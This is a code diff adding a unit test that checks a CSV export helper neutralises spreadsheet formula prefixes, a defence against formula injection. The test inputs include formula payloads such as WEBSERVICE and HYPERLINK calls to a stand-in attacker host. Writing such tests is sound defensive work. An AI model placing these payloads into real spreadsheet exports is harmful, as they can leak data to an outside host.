@@ -15,8 +15,22 @@ describe("csvValue", () => {
     assert.equal(csvValue(["a", "b"]), "a; b");
     assert.equal(csvValue(7), "7");
   });
-});
 
+  test("neutralizes spreadsheet formula prefixes", () => {
+    assert.equal(
+      csvValue('=WEBSERVICE("https://attacker.example")'),
+      '"\'=WEBSERVICE(""https://attacker.example"")"',
+    );
+    assert.equal(
+      csvValue('+HYPERLINK("https://attacker.example")'),
+      '"\'+HYPERLINK(""https://attacker.example"")"',
+    );
+    assert.equal(csvValue("-2+3"), "'-2+3");
+    assert.equal(csvValue("@SUM(1,1)"), '"\'@SUM(1,1)"');
+    assert.equal(csvValue("\t=1+1"), "'\t=1+1");
+    assert.equal(csvValue(["=evil", "safe"]), "'=evil; safe");
+  });
+});
 describe("toCsv", () => {
   test("has a header row and quoted fields", () => {
     const rows = [
